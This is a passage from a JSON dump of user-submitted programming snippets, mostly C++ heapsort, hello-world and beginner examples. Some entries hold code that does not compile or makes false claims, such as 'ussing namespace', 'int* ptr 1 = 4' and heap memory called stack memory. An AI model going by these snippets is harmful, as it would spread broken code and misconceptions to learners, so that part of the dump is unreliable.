The sorted array is : \");    for (i = 0; i < array_size; i++)       printf(\"\\t %d\", heap[i]); }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2258,
    "keyword": null,
    "link": null,
    "title": " heapsort",
    "description": "#include <iostream>   using namespace std;    void heapify(int arr[], int n, int i) {     int largest = i;      int l = 2 * i + 1;     int r = 2 * i + 2;            if (l < n && arr[l] > arr[largest])         largest = l;            if (r < n && arr[r] > arr[largest])         largest = r;            if (largest != i) {         swap(arr[i], arr[largest]);                heapify(arr, n, largest);     } }    void heapSort(int arr[], int n) {      for (int i = n / 2 - 1; i >= 0; i--)         heapify(arr, n, i);        for (int i = n - 1; i > 0; i--) {                 swap(arr[0], arr[i]);         heapify(arr, i, 0);     } }    void printArray(int arr[], int n) {     for (int i = 0; i < n; ++i)         cout << arr[i] << \" \";     cout << \"\\n\"; }    int main() {     int arr[] = { 12, 11, 13, 5, 6, 7 };     int n = sizeof(arr) / sizeof(arr[0]);       heapSort(arr, n);       cout << \"Sorted array is \\n\";     printArray(arr, n); }\n// Heap Sort in C      #include <stdio.h>      // Function to swap the the position of two elements   void swap(int *a, int *b) {     int temp = *a;     *a = *b;     *b = temp;   }      void heapify(int arr[], int n, int i) {     // Find largest among root, left child and right child     int largest = i;     int left = 2 * i + 1;     int right = 2 * i + 2;        if (left < n && arr[left] > arr[largest])       largest = left;        if (right < n && arr[right] > arr[largest])       largest = right;        // Swap and continue heapifying if root is not largest     if (largest != i) {       swap(&arr[i], &arr[largest]);       heapify(arr, n, largest);     }   }      // Main function to do heap sort   void heapSort(int arr[], int n) {     // Build max heap     for (int i = n / 2 - 1; i >= 0; i--)       heapify(arr, n, i);        // Heap sort     for (int i = n - 1; i >= 0; i--) {       swap(&arr[0], &arr[i]);          // Heapify root element to get highest element at root again       heapify(arr, i, 0);     }   }      // Print an array   void printArray(int arr[], int n) {     for (int i = 0; i < n; ++i)       printf(\"%d \", arr[i]);     printf(\"\\n\");   }      // Driver code   int main() {     int arr[] = {1, 12, 9, 5, 6, 10};     int n = sizeof(arr) / sizeof(arr[0]);        heapSort(arr, n);        printf(\"Sorted array is \\n\");     printArray(arr, n);   }\n// @see https://www.youtube.com/watch?v=H5kAcmGOn4Q  function heapify(list, size, index) {     let largest = index;     let left = index * 2 + 1;     let right = left + 1;     if (left < size && list[left] > list[largest]) {         largest = left;     }     if (right < size && list[right] > list[largest]) {         largest = right;     }     if (largest !== index) {         [list[index], list[largest]] = [list[largest], list[index]];         heapify(list, size, largest);     }     return list; }  function heapsort(list) {     const size = list.length;     let index = ~~(size / 2 - 1);     let last = size - 1;     while (index >= 0) {         heapify(list, size, --index);     }     while (last >= 0) {         [list[0], list[last]] = [list[last], list[0]];         heapify(list, --last, 0);     }     return list; }  heapsort([4, 7, 2, 6, 4, 1, 8, 3]);\nImplementation of heap sort in C++:  #include <bits/stdc++.h> using namespace std;  // To heapify a subtree rooted with node i which is // Heapify:- A process which helps regaining heap properties in tree after removal  void heapify(int A[], int n, int i) {    int largest = i; // Initialize largest as root    int left_child = 2 * i + 1; // left = 2*i + 1    int right_child = 2 * i + 2; // right = 2*i + 2     // If left child is larger than root    if (left_child < n && A[left_child] > A[largest])        largest = left_child;     // If right child is larger than largest so far    if (right_child < n && A[right_child] > A[largest])        largest = right_child;     // If largest is not root    if (largest != i) {        swap(A[i], A[largest]);         // Recursively heapify the affected sub-tree        heapify(A, n, largest);    } }  // main function to do heap sort void heap_sort(int A[], int n) {    // Build heap (rearrange array)    for (int i = n / 2 - 1; i >= 0; i--)        heapify(A, n, i);     // One by one extract an element from heap    for (int i = n - 1; i >= 0; i--) {        // Move current root to end        swap(A[0], A[i]);         // call max heapify on the reduced heap        heapify(A, i, 0);    } }  /* A  function to print sorted Array */ void printArray(int A[], int n) {    for (int i = 0; i < n; ++i)        cout << A[i] << \" \";    cout << \"\\n\"; }  // Driver program int main() {    int A[] = { 22, 19, 3, 25, 26, 7 }; // array to be sorted    int n = sizeof(A) / sizeof(A[0]); // n is size of array     heap_sort(A, n);     cout << \"Sorted array is \\n\";    printArray(A, n); }\n#include <iostream>  using namespace std; void swap(int*,int*); void heapify(int arr[],int n,int index) {     int left=2*index+1;     int right=left+1;     int max=index;     if(left<n&&arr[left]>arr[max])     {         max=left;     }     if(right<n&&arr[right]>arr[max])     {         max=right;     }     if(index!=max)     {         swap(&arr[index],&arr[max]);         heapify(arr,n,max);     } } void buildheap(int arr[],int n) {     for(int i=(n/2);i>=0;i--)     {         heapify(arr,n,i);     } }  void heapsort(int arr[],int n) {     buildheap(arr,n);     int l=n-1;     while(l>0)     {         swap(&arr[0],&arr[l]);         l--;         n--;         heapify(arr,n,0);     } } void disp(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int a[n];      cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>a[i];     }     cout<<\"array before sorting:\"<<endl;     for(int i=0;i<n;i++)     {         cout<<a[i]<<\" \";     }     cout<<endl;     //buildheap(a,n);     //disp(a,n);     cout<<\"array after sorting:\"<<endl;     heapsort(a,n);     disp(a,n);     return 0; } void swap(int*a,int*b) {     int temp=*a;     *a=*b;     *b=temp; } \nvoid heapify(int arr[], int n, int i) {   // Find largest among root, left child and right child   int largest = i;   int left = 2 * i + 1;   int right = 2 * i + 2;    if (left < n && arr[left] > arr[largest])     largest = left;    if (right < n && arr[right] > arr[largest])     largest = right;      // Swap and continue heapifying if root is not largest     if (largest != i) {       swap(&arr[i], &arr[largest]);       heapify(arr, n, largest);   } }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2259,
    "keyword": null,
    "link": null,
    "title": " hell0w worldcpp",
    "description": "#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2260,
    "keyword": null,
    "link": null,
    "title": " hello",
    "description": "Hey :)\nhi how are you?\nhi how are you doing  \nHello! Hope you are having a great day! :D\nHello friend!\nHi there\nhi bro\nWell hi there !\nprint\"hello\"\nwhat you type when you're bored and happen to have internet. \n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2261,
    "keyword": null,
    "link": null,
    "title": " hello c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream>  using namespace std;  int main() {     cout << \"Hello World\" << endl; }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2262,
    "keyword": null,
    "link": null,
    "title": " hello world",
    "description": "class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\nprint(\"Hello World\")\n// Objective-C hello world  #import <Foundation/Foundation.h>  int main(int argc, char * argv[]) {   @autoreleasepool {     NSLog (@\"Hello, World\");   } }\n// I can't believe there is no grepper answer here!  // Here is Java hello world:  public class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\n#include <iostream> int main(){ cout << \"Hello World!\"; return 0; }\necho(\"hello world\");\n#include <iostream> std::cout << \"Hello, World!\";\nHello World!\n<p>Hello World </p>\n//This is a simple Hello World program.  public class hello world { \tpublic static void main(Strin[] args) {      \tSystem.out.println(\"Hello World\");      } }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2263,
    "keyword": null,
    "link": null,
    "title": " hello world c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include <iostream> std::cout << \"Hello, World!\";\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <iostream> // Include standard library and namespace using namespace std; // for c++  int main () // where program starts { \tcout << \"Hello World!\\n\"; // cout (part of std) prints message   \treturn 0; // return int because main is of type int }\n#include <iostream>  using namespace std;  int main() {  cout << \"Hello World\" << endl;\t\t// endl = '\\n'  return 0; }\n#include <iostream> using namespace std;  int main() {  cout << \"Hello World\" << endl;   return 0; }\nConsole.Write(\"Hello World!\");\n#include <iostream> using namespace std; int main() {  cout<<\"Hello World!\";   return 0; }\n#include <iostream> using std::cout; int main() {      cout<<\"Hello world\";     return 0; }\n#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2264,
    "keyword": null,
    "link": null,
    "title": " hello world c++ visual studio",
    "description": "#include <iostream> using namespace std;  int main() {  \tcout << \"Hello World\\n\";   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2265,
    "keyword": null,
    "link": null,
    "title": " hello world cc++",
    "description": "#include <iostream> ussing namespace std; int main() { cout << \"Hello World\" << endl; return 0; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2266,
    "keyword": null,
    "link": null,
    "title": " hello world dll c++",
    "description": "#define WIN32_LEAN_AND_MEAN #include <windows.h>  extern \"C\" __declspec(dllexport) DWORD WINAPI MessageBoxThread(LPVOID lpParam) {   MessageBox(NULL, \"Hello world!\", \"Hello World!\", NULL);   return 0; }  extern \"C\" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE hModule,                       DWORD ul_reason_for_call,                       LPVOID lpReserved) {   switch (ul_reason_for_call) {     case DLL_PROCESS_ATTACH:       CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);       break;     case DLL_THREAD_ATTACH:     case DLL_THREAD_DETACH:     case DLL_PROCESS_DETACH:       break;   }   return TRUE; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2267,
    "keyword": null,
    "link": null,
    "title": " hello world in c++",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n#include <bits/stdc++.h>  using namespace std;  int main(){ \tcout << \"hello world! \\n\";  }                                                     //code by goukl aakash\n#include <iostream> using namespace std;   int main(){   cout << \"Hello World\" << endl;   return 0; }\n#include <iostream> using namespace std; int main(){   std:cout<< \"hello world\" << std:endl;\n#include <iostream> using namespace std;  int main() {   cout << \"Hello World!\";   return 0; } \n#include <iostream>  using namespace std;  int main() {   \tcout << \"Hello World\";   \treturn 0; }\n#include <iostream>  int main() {   std::cout << \"Hello World!\";      return 0; }\n#include<iostream> using namespace std; int main(){   cout<<\"hello World\"<<endl;   return 0; }\n#include <iostream> int main(){   std::cout << \"Hello World\" << std::endl;   return 0; }\n#include <iostream>   // Anything in the main function will get executed even without calling it. int main(){   \t// The function cout in the STD or Standard Library will print out stuff to the console. \tstd::cout <<\"Hello world.\"; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2268,
    "keyword": null,
    "link": null,
    "title": " hello world in cpp",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream> std::cout << \"Hello, World!\";\n#include <iostream> // Include standard library and namespace using namespace std; // for c++  int main () // where program starts { \tcout << \"Hello World!\\n\"; // cout (part of std) prints message   \treturn 0; // return int because main is of type int }\n#include <bits/stdc++.h>  using namespace std;  int main(){ \tcout << \"hello world! \\n\";  }                                                     //code by goukl aakash\n#include <iostream> using namespace std; int main() {      cout<<\"Hello world\";     return 0; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2269,
    "keyword": null,
    "link": null,
    "title": " hello world in visual c++",
    "description": "#include <iostream> using namespace std; int main() {     cout << \"Hello, world, from Visual C++!\" << endl; } \n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2270,
    "keyword": null,
    "link": null,
    "title": " hello world program in c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2271,
    "keyword": null,
    "link": null,
    "title": " helloworld  in c++",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2272,
    "keyword": null,
    "link": null,
    "title": " helper functions c++",
    "description": "[helper.hpp] std::string myReplace(const std::string& s);  [helper.cpp] std::string myReplace(const std::string& s) {    ... }  [somefile.cpp] #include \"helper.hpp\" otherString3 = myReplace(myString3); \n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2273,
    "keyword": null,
    "link": null,
    "title": " heredar constructor c++",
    "description": "class Bar {   public:       Bar(int weight, int height); }  class Computer: public Bar { \tpublic:  \t   Computer(int weight, int height): Bar(weight, height) {}; }; \n",
    "reg_date": "2021-10-12T11:40:37.000Z"
  },
  {
    "id": 2274,
    "keyword": null,
    "link": null,
    "title": " heroatx77",
    "description": "hacked hacked \n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2275,
    "keyword": null,
    "link": null,
    "title": " hi cpp",
    "description": "#include <iostream>  using namespace std;  int main(){  cout <<\"Hi\" << \"\\n\";   //\"Hello world\" and a newline is output.  return 0; }\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2276,
    "keyword": null,
    "link": null,
    "title": " hide terminal window c++",
    "description": "// Detaches the calling process from its console.  BOOL FreeConsole(void);\nmyConsole = GetConsoleWindow(); ShowWindow(myConsole,SW_HIDE);\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2277,
    "keyword": null,
    "link": null,
    "title": " hide window c++",
    "description": "#if       _WIN32_WINNT < 0x0500   #undef  _WIN32_WINNT   #define _WIN32_WINNT   0x0500 #endif #include <windows.h>\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2278,
    "keyword": null,
    "link": null,
    "title": " histogram c++",
    "description": "#include<iostream> #include<cstdlib> #include<ctime>  #include<iomanip> #include<vector> #include<cmath> #include<algorithm>    int main( ) {     std::cout << \"enter seeding number: \" ;      int num_seed = 0 ;     std::cin >> num_seed ;     srand( num_seed ) ;     std::cout << \"enter numbers of tries: \";     int tries = 0 ;     std::cin >> tries ;     std::cout << \"enter numbers of asterikes: \";      int asterikes = 0 ;     std::cin >> asterikes ;      double sum_of_three_dices , average_of_three_dices,sigme_dices_powered, variation, standard_dev = 0.0 ;     std::vector<size_t> vec_of_three_dice(19,0);     for(size_t i = 0; i < tries ; i++)     {         int dice_one = rand()%6 + 1 ;         int dice_two = rand()%6 + 1 ;         int dice_three = rand()%6 + 1 ;         vec_of_three_dice[dice_one + dice_two + dice_three] += 1 ;         sum_of_three_dices += dice_one + dice_two +dice_three ;         average_of_three_dices = sum_of_three_dices / tries ;         sigme_dices_powered += pow(dice_one + dice_two + dice_three ,2);         variation = sigme_dices_powered/tries - pow(average_of_three_dices,2);         standard_dev = sqrt(variation);     }      average_of_three_dices = sum_of_three_dices / tries ;     std::cout << \"average_of_three_dices is: \" <<std::fixed << std::setprecision(3) << average_of_three_dices << std::endl;     std::cout << \"standard deviation is: \" <<std::fixed << std::setprecision(3) << standard_dev << std::endl;     std::cout << std::endl;     // creating a histogram      int max_value = *max_element(vec_of_three_dice.begin(),vec_of_three_dice.end());     for(size_t i = 3; i <vec_of_three_dice.size() ; i ++ ){         if(i < 10 ){             std::cout <<std::setw(2) <<std::setfill(' ') << i<< \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\" ;         }else{             std::cout << i << \" : \" <<\"(\"<<std::setw(4)<<std::setfill(' ')<<vec_of_three_dice.at(i) << \")\";         }        for(size_t j = 0; j <= static_cast<size_t>(vec_of_three_dice.at(i) * asterikes)/max_value ; j++ ){            std::cout << \"*\";        }         std::cout << std::endl;       }             return 0 ; }\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2279,
    "keyword": null,
    "link": null,
    "title": " hola mundo c++",
    "description": "// Primer programa de ejemplo en C++   #include <iostream>   int main ()  {     std::cout << \"Hola, mundo\";     return 0; }\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2280,
    "keyword": null,
    "link": null,
    "title": " hollow rectangle pattern c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint row,col; \tcin>>row>>col; \tfor(int i=1;i<=row;i++){ \t\tfor(int j=1;j<=col;j++){ \t\t\tif(i==1||i==row||j==1||j==col){ \t\t\t\tcout<<\"*\"; \t\t\t} \t\t\telse{ \t\t\t\tcout<<\" \"; \t\t\t} \t\t} \t\tcout<<endl; \t} }\n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2281,
    "keyword": null,
    "link": null,
    "title": " hollow rectangle pattern in c++",
    "description": "#include <iostream> using namespace std; int main() {     int row, col;     cout << \"Enter number of rows and columns to create a hollow rectangle: \";     cin >> row >> col;      for (int i = 1; i <= row; i++)     {         for (int j = 1; j <= col; j++)         {             if (i == 1 || i == row || j == 1 || j == col) // you can either use a single loop or use elseif with it.             {                 cout << \"*\";             }             // else if (j == 1 || j == col)             // {             //     cout << \"*\";             // }             else             {                 cout << \" \";             }         }         cout << endl;     }      return 0; } \n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2282,
    "keyword": null,
    "link": null,
    "title": " honeygain linux",
    "description": "sudo apt install --install-recommends winehq-stable \n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2283,
    "keyword": null,
    "link": null,
    "title": " how-to-read-until-eof-from-cin-in-c++",
    "description": "#include <iostream> #include <iterator> #include <string>  int main() {   std::istreambuf_iterator<char> begin(std::cin), end;   std::string s(begin, end);   std::cout << s; } \n",
    "reg_date": "2021-10-12T11:40:38.000Z"
  },
  {
    "id": 2284,
    "keyword": null,
    "link": null,
    "title": " how are graphics in games made",
    "description": "how are graphics in games made\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2285,
    "keyword": null,
    "link": null,
    "title": " how can make string value in cpp",
    "description": "#include <string> string hello= \"hello you thre :)\";\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2286,
    "keyword": null,
    "link": null,
    "title": " how creat matrix column in c++",
    "description": "#include <iostream>  using namespace std;  template <int rows, int cols> void display(int (&array)[rows][cols]) {   int i, j;   cout<<\"\\n\";   for(i = 0; i<rows; i++) {       for(j = 0; j<cols; j++) {         cout<<\" \";         cout<<array[i][j];       }       cout<<\"\\n\";     } }   int main() {   int M1[3][3];   cout<<\"Enter your matrix elements: \\n\";   int i, j;     for(i = 0; i<3; i++) {       for(j = 0; j<3; j++) {         cout<<\"a[\"<<i<<\"][\"<<j<<\"]: \";         cin>>M1[i][j];       }     }     display(M1);   return 0; } \n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2287,
    "keyword": null,
    "link": null,
    "title": " how do for loops on c++",
    "description": "for ( init; condition; increment ) {    statement(s); }\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2288,
    "keyword": null,
    "link": null,
    "title": " how does ++operator works in c++",
    "description": "#include <stdio.h> int main() {    int var1 = 5, var2 = 5;     // 5 is displayed    // Then, var1 is increased to 6.    printf(\"%d\\n\", var1++);     // var2 is increased to 6     // Then, it is displayed.    printf(\"%d\\n\", ++var2);     return 0; }\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2289,
    "keyword": null,
    "link": null,
    "title": " how i say hello world in c++",
    "description": "cout << \"Hello World!\";\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2290,
    "keyword": null,
    "link": null,
    "title": " how initilaize deffult value to c++ class",
    "description": "class X {   int i = 4;   int j {5}; public:   X(int a) : i{a} {}  //initializes with a and 5   X() = default;      //initializes with 4 and 5 };\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2291,
    "keyword": null,
    "link": null,
    "title": " how long can a c++ string be",
    "description": "// A C++ string can have up to 4294967295 characters\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2292,
    "keyword": null,
    "link": null,
    "title": " how next permutation works in c++",
    "description": "The following algorithm generates the next permutation lexicographically after a given permutation. It changes the given permutation in-place.  Find the largest index k such that a[k] < a[k + 1]. If no such index exists, the permutation is the last permutation. Find the largest index l such that a[k] < a[l]. Since k + 1 is such an index, l is well defined and satisfies k < l. Swap a[k] with a[l]. Reverse the sequence from a[k + 1] up to and including the final element a[n].    For example, given the sequence [1, 2, 3, 4] (which is in increasing order), and given that the index is zero-based, the steps are as follows:  Index k = 2, because 3 is placed at an index that satisfies condition of being the largest index that is still less than a[k + 1] which is 4. Index l = 3, because 4 is the only value in the sequence that is greater than 3 in order to satisfy the condition a[k] < a[l]. The values of a[2] and a[3] are swapped to form the new sequence [1,2,4,3]. The sequence after k-index a[2] to the final element is reversed. Because only one value lies after this index (the 3), the sequence remains unchanged in this instance. Thus the lexicographic successor of the initial state is permuted: [1,2,4,3]. Following this algorithm, the next lexicographic permutation will be [1,3,2,4], and the 24th permutation will be [4,3,2,1] at which point a[k] < a[k + 1] does not exist, indicating that this is the last permutation.\n",
    "reg_date": "2021-10-12T11:40:39.000Z"
  },
  {
    "id": 2293,
    "keyword": null,
    "link": null,
    "title": " how print fload wiht 2 decimal in c++",
    "description": "#include <iostream> #include <cstdio> using namespace std;  int main()  {     // This code helps you to print a number with desired decimal     double Number=10.3454;     printf(\"%.3lf\",Number);      return 0; }\n#include <iostream> #include <iomanip> using namespace std;  int main() { \tfloat x=10.3445f; \t \tcout<<fixed<<setprecision(5)<<x<<endl; \tcout<<fixed<<setprecision(2)<<x<<endl; \tcout<<fixed<<setprecision(3)<<x<<endl; \tcout<<fixed<<setprecision(0)<<x<<endl; \t \treturn 0; } \n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2294,
    "keyword": null,
    "link": null,
    "title": " how print fload wiht 3 decimal in c++",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;      std::cout << std::fixed;     std::cout << std::setprecision(2);     std::cout << d; }\n#include <iostream> #include <iomanip>  int main() {     double d = 122.345;     std::cout << std::fixed << std::setprecision(2) << d; }  //result that get print out: 122.34\n#include <iostream> #include <cstdio> using namespace std;  int main()  {     // This code helps you to print a number with desired decimal     double Number=10.3454;     printf(\"%.3lf\",Number);      return 0; }\nstd::cout << std::setprecision(2) << std::fixed; // where the 2 is how many decimal places you want // note you need to <iomanip>\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2295,
    "keyword": null,
    "link": null,
    "title": " how read a shader from another file c++",
    "description": "#include \"GLShader.hpp\"  #include <string> #include <iostream> #include <fstream> #include <vector> #include <algorithm>   std::string readFile(const char *filePath) {     std::string content;     std::ifstream fileStream(filePath, std::ios::in);      if(!fileStream.is_open()) {         std::cerr << \"Could not read file \" << filePath << \". File does not exist.\" << std::endl;         return \"\";     }      std::string line = \"\";     while(!fileStream.eof()) {         std::getline(fileStream, line);         content.append(line + \"\\n\");     }      fileStream.close();     return content; }   GLuint LoadShader(const char *vertex_path, const char *fragment_path) {     GLuint vertShader = glCreateShader(GL_VERTEX_SHADER);     GLuint fragShader = glCreateShader(GL_FRAGMENT_SHADER);      // Read shaders      std::string vertShaderStr = readFile(vertex_path);     std::string fragShaderStr = readFile(fragment_path);     const char *vertShaderSrc = vertShaderStr.c_str();     const char *fragShaderSrc = fragShaderStr.c_str();      GLint result = GL_FALSE;     int logLength;      // Compile vertex shader      std::cout << \"Compiling vertex shader.\" << std::endl;     glShaderSource(vertShader, 1, &vertShaderSrc, NULL);     glCompileShader(vertShader);      // Check vertex shader      glGetShaderiv(vertShader, GL_COMPILE_STATUS, &result);     glGetShaderiv(vertShader, GL_INFO_LOG_LENGTH, &logLength);     std::vector vertShaderError((logLength > 1) ? logLength : 1);     glGetShaderInfoLog(vertShader, logLength, NULL, &vertShaderError[0]);     std::cout << &vertShaderError[0] << std::endl;      // Compile fragment shader      std::cout << \"Compiling fragment shader.\" << std::endl;     glShaderSource(fragShader, 1, &fragShaderSrc, NULL);     glCompileShader(fragShader);      // Check fragment shader      glGetShaderiv(fragShader, GL_COMPILE_STATUS, &result);     glGetShaderiv(fragShader, GL_INFO_LOG_LENGTH, &logLength);     std::vector fragShaderError((logLength > 1) ? logLength : 1);     glGetShaderInfoLog(fragShader, logLength, NULL, &fragShaderError[0]);     std::cout << &fragShaderError[0] << std::endl;      std::cout << \"Linking program\" << std::endl;     GLuint program = glCreateProgram();     glAttachShader(program, vertShader);     glAttachShader(program, fragShader);     glLinkProgram(program);      glGetProgramiv(program, GL_LINK_STATUS, &result);     glGetProgramiv(program, GL_INFO_LOG_LENGTH, &logLength);     std::vector<char> programError( (logLength > 1) ? logLength : 1 );     glGetProgramInfoLog(program, logLength, NULL, &programError[0]);     std::cout << &programError[0] << std::endl;      glDeleteShader(vertShader);     glDeleteShader(fragShader);      return program; }\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2296,
    "keyword": null,
    "link": null,
    "title": " how refrence and pointer works in a function",
    "description": " int func (int a) { \ta = 300; \treturn a; }  int func2 (int& a) { \ta = -2; \treturn a; }  int func3 (long* a) { \t*a = 10; \treturn *a; }   int main() { \t \tint a = 0; \tint b = 0; \tint c = 0;  \tlong *d = new long (300);  \tcout << func(a) << ' ' << a << '\\n'; // 300  0  \tcout << func2(b) << ' ' << b << '\\n'; // -2  -2  \tcout << func3(d) << ' ' << *d << '\\n'; // 10  10  \tkeep_window_open(); }\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2297,
    "keyword": null,
    "link": null,
    "title": " how the theam are store in database",
    "description": "what is the system design of resume builder with different theams work\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2298,
    "keyword": null,
    "link": null,
    "title": " how to access individual characters in string c++",
    "description": "   string    myString = \"Hello\"; cout << myString[0]; // Outputs H    \n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2299,
    "keyword": null,
    "link": null,
    "title": " how to access the element of string in c++",
    "description": "string myString = \"Hello\"; cout << myString[0]; // Outputs H\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2300,
    "keyword": null,
    "link": null,
    "title": " how to acess superclass properties with the same name in c++",
    "description": "class A { public:   int x; };   class B : public A { public:   int x;   B()    {      x = 0;     A::x = 1;   } };\n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2301,
    "keyword": null,
    "link": null,
    "title": " how to add a number after each number in an array with a for loop in C++",
    "description": " \t#include<iostream> \tusing namespace std;  \tint main() \t{ \t\tint a[4]; \t\tint i;  \t\tfor ( i = 0; i < 4; i++ ) \t\t\ta[i] = 0; \t\tfor ( i = 0; i < 4; i++ ) \t\t\tcout << a[i] << '\\n'; \t\treturn 0; \t}  \n",
    "reg_date": "2021-10-12T11:40:40.000Z"
  },
  {
    "id": 2302,
    "keyword": null,
    "link": null,
    "title": " how to add and read a file in c++ in visual studio",
    "description": "#include <iostream> #include <string> #include <iomanip> #include <fstream>  using namespace std;  int main() {  \tstring input; \tfstream file; \tchar ch;    \tcout << \"Please enter the file name. \"; \tcin >> input;  \tfile.open(input, ios::in);  \tif (file) {  \t\tfile.get(ch); \t\t \t\twhile (file) { \t\t\tcout << ch; \t\t\tfile.get(ch); \t\t} \t\tfile.close(); \t} \telse {  \t\tcout << \"Error! \" << endl; \t}   \tsystem(\"pause\"); \treturn 0;  }\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2303,
    "keyword": null,
    "link": null,
    "title": " how to add elements in an array in for loop c++",
    "description": "  int * myVar = new int [5]; for (int i = 0; i < 5; i++) \tmyVar[i] = i  // 0 1 2 3 4 myVar in the array   // delete stuff *optional* delete [] myVar; myVar = NULL;   // free up memory declared on the stack  \n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2304,
    "keyword": null,
    "link": null,
    "title": " how to add external library in clion",
    "description": "include_directories(\"/usr/include/SDL2\") target_link_libraries(ProjectName \"/usr/lib/x86_64-linux-gnu/libSDL.so\")\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2305,
    "keyword": null,
    "link": null,
    "title": " how to add numbers in for loop c++",
    "description": "#include <iostream>  int main() {   int n = 0;   int sum = 0;   std::cout << \"Please enter and integer: \";   std::cin >> n;    //this will ensure that the integer is posetive.   while (n < 0 ) {     std::cout <<\"Please enter positive integer only.\\n\";     std::cout << \"Please enter and integer: \";     std::cin >> n;   }    for (int i = 0; i < n ; i++) {     std::cout << i << \"\\n\";     sum +=i   }   std::cout << \"Sum of odd numbers is \" << sum <<\".\\n\";  }\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2306,
    "keyword": null,
    "link": null,
    "title": " how to add space in c++",
    "description": "cout << \"Hello\" << \" \"<< \"World!\";\n",
    "reg_date": "2021-10-12T11:40:41.000Z"
  },
  {
    "id": 2307,
    "keyword": null,
    "link": null,
    "title": " how to adjust and delete memory in c, c++",
    "description": "#include<iostream> using namespace std; int main() {   int* ptr 1 = 4;   delete ptr1; }\n",
